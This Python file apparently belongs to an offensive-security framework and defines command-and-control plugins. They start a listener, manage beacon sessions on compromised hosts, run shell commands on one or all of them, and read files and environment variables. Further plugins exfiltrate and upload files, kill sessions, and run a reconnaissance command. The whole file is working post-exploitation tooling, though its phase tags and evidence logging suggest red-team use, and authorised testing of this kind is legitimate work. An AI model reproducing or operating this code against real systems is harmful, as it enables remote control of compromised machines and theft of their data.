"""C2 listener + multi-session post-exploitation plugins."""

from __future__ import annotations

from typing import Any

from cerberus.core.c2 import C2Server, get_c2, set_c2
from cerberus.core.phase import Phase
from cerberus.core.plugin_api import OpsecLevel, Plugin, PluginMeta, register_plugin

POSTEX_PHASES = [Phase.EXPLOIT, Phase.PRIVESC, Phase.LATERAL, Phase.EXFIL]


@register_plugin
class C2StartPlugin(Plugin):
    meta = PluginMeta(
        name="c2_start",
        description="Start the C2 TCP listener (AES-GCM if c2_key set)",
        phase=POSTEX_PHASES,
        opsec=OpsecLevel.MEDIUM,
        requires=[],
        produces=["c2"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        existing = get_c2()
        if existing and existing.running:
            return {
                "success": True,
                "message": f"C2 already running on {existing.host}:{existing.port}",
                "port": existing.port,
                "encrypted": existing.key is not None,
            }

        host = kwargs.get("host") or "0.0.0.0"
        port = int(kwargs.get("port") or self.config.c2_port)
        secret = kwargs.get("key") or getattr(self.config, "c2_key", None) or None
        if secret == "":
            secret = None
        loot = self.config.sessions_dir / "loot"

        server = C2Server(host=host, port=port, loot_dir=loot, secret=secret)
        await server.start()
        set_c2(server)

        self.evidence.add(
            kind="c2",
            target=f"{host}:{port}",
            data={"host": host, "port": port, "encrypted": bool(secret), "status": "listening"},
            source="c2_start",
            plugin="c2_start",
            confidence=1.0,
        )
        return {
            "success": True,
            "message": f"C2 listening on {host}:{port} encrypted={bool(secret)}",
            "port": port,
            "encrypted": bool(secret),
        }


@register_plugin
class C2StopPlugin(Plugin):
    meta = PluginMeta(
        name="c2_stop",
        description="Stop the C2 TCP listener",
        phase=POSTEX_PHASES + [Phase.REPORT],
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server or not server.running:
            return {"success": True, "message": "C2 was not running"}
        await server.stop()
        set_c2(None)
        return {"success": True, "message": "C2 stopped"}


@register_plugin
class C2BeaconsPlugin(Plugin):
    meta = PluginMeta(
        name="c2_beacons",
        description="List all beacon sessions (multi-session view)",
        phase=POSTEX_PHASES,
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running — start with c2_start"}
        beacons = server.list_beacons()
        return {
            "success": True,
            "message": f"{len(beacons)} session(s)",
            "beacons": beacons,
            "active": server.active_id,
        }


@register_plugin
class C2InteractPlugin(Plugin):
    meta = PluginMeta(
        name="c2_interact",
        description="Focus operator session on a beacon (set active)",
        phase=POSTEX_PHASES,
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = kwargs.get("beacon") or kwargs.get("id")
        if not bid:
            return {"success": False, "message": "need beacon=<id>"}
        if not server.interact(bid):
            return {"success": False, "message": f"beacon {bid} not found"}
        label = kwargs.get("label")
        if label:
            server.set_label(bid, str(label))
        return {"success": True, "message": f"active session → {bid}", "active": bid}


@register_plugin
class C2ShellPlugin(Plugin):
    meta = PluginMeta(
        name="c2_shell",
        description="Run a shell command on a beacon (or active session)",
        phase=POSTEX_PHASES,
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = kwargs.get("beacon") or kwargs.get("id") or server.active_id
        cmd = kwargs.get("cmd") or kwargs.get("command")
        if not bid or not cmd:
            return {"success": False, "message": "need beacon=<id> (or active) and cmd=<command>"}
        ok = await server.task(bid, "shell", {"cmd": cmd})
        if not ok:
            return {"success": False, "message": f"beacon {bid} not found"}
        return {"success": True, "message": f"shell → {bid}: {cmd}", "beacon": bid}


@register_plugin
class C2BroadcastPlugin(Plugin):
    meta = PluginMeta(
        name="c2_broadcast",
        description="Run the same shell command on ALL beacons",
        phase=POSTEX_PHASES,
        opsec=OpsecLevel.DANGEROUS,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        cmd = kwargs.get("cmd") or kwargs.get("command")
        if not cmd:
            return {"success": False, "message": "need cmd=<command>"}
        n = await server.broadcast("shell", {"cmd": cmd})
        return {"success": True, "message": f"broadcast to {n} session(s): {cmd}", "count": n}


@register_plugin
class C2ResultsPlugin(Plugin):
    meta = PluginMeta(
        name="c2_results",
        description="Fetch results from a beacon (or active)",
        phase=POSTEX_PHASES,
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = kwargs.get("beacon") or kwargs.get("id") or server.active_id
        if not bid:
            return {"success": False, "message": "need beacon=<id> or an active session"}
        clear = bool(kwargs.get("clear", False))
        results = server.get_results(bid, clear=clear)
        return {"success": True, "message": f"{len(results)} result(s) from {bid}", "results": results, "beacon": bid}


def _make_postex(name: str, desc: str, mtype: str, opsec: OpsecLevel = OpsecLevel.HIGH):
    class _P(Plugin):
        meta = PluginMeta(
            name=name,
            description=desc,
            phase=POSTEX_PHASES,
            opsec=opsec,
            requires=[],
            produces=[],
        )

        async def run(self, **kwargs: Any) -> dict[str, Any]:
            server = get_c2()
            if not server:
                return {"success": False, "message": "C2 not running"}
            bid = kwargs.get("beacon") or kwargs.get("id") or server.active_id
            if not bid:
                return {"success": False, "message": "need beacon=<id> or active session"}
            data = {k: v for k, v in kwargs.items() if k not in ("beacon", "id") and v is not None}
            ok = await server.task(bid, mtype, data)
            if not ok:
                return {"success": False, "message": f"beacon {bid} not found"}
            return {"success": True, "message": f"{mtype} → {bid}", "beacon": bid, "data": data}

    _P.__name__ = f"Plugin_{name}"
    register_plugin(_P)
    return _P


_make_postex("c2_ls", "List remote directory on beacon", "ls", OpsecLevel.MEDIUM)
_make_postex("c2_cat", "Read remote file (path=)", "cat", OpsecLevel.MEDIUM)
_make_postex("c2_ps", "List processes on beacon", "ps", OpsecLevel.MEDIUM)
_make_postex("c2_env", "Dump environment variables", "env", OpsecLevel.MEDIUM)
_make_postex("c2_pwd", "Print working directory", "pwd", OpsecLevel.SAFE)
_make_postex("c2_download", "Exfil file from beacon (path=)", "download", OpsecLevel.HIGH)
_make_postex("c2_sleep", "Set beacon sleep interval (seconds=)", "sleep", OpsecLevel.SAFE)
_make_postex("c2_exit", "Kill a beacon session", "exit", OpsecLevel.HIGH)


@register_plugin
class C2UploadPlugin(Plugin):
    meta = PluginMeta(
        name="c2_upload",
        description="Upload local file to beacon (local= path, remote= path)",
        phase=POSTEX_PHASES,
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        import base64
        from pathlib import Path

        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = kwargs.get("beacon") or kwargs.get("id") or server.active_id
        local = kwargs.get("local") or kwargs.get("path")
        remote = kwargs.get("remote") or kwargs.get("dest")
        if not bid or not local or not remote:
            return {"success": False, "message": "need beacon, local=, remote="}
        p = Path(local)
        if not p.exists():
            return {"success": False, "message": f"local file not found: {local}"}
        raw = p.read_bytes()
        b64 = base64.b64encode(raw).decode()
        ok = await server.task(bid, "write", {"path": remote, "content": b64})
        if not ok:
            return {"success": False, "message": f"beacon {bid} not found"}
        return {
            "success": True,
            "message": f"upload {local} → {bid}:{remote} ({len(raw)} bytes)",
            "beacon": bid,
        }


@register_plugin
class C2SysinfoPlugin(Plugin):
    meta = PluginMeta(
        name="c2_sysinfo",
        description="Collect system info from beacon",
        phase=POSTEX_PHASES,
        opsec=OpsecLevel.MEDIUM,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = kwargs.get("beacon") or kwargs.get("id") or server.active_id
        if not bid:
            return {"success": False, "message": "need beacon=<id> or active session"}
        cmd = "echo '===ID==='; id; echo '===UNAME==='; uname -a; echo '===CWD==='; pwd; echo '===USER==='; whoami"
        ok = await server.task(bid, "shell", {"cmd": cmd})
        return {"success": ok, "message": f"sysinfo tasked → {bid}", "beacon": bid}
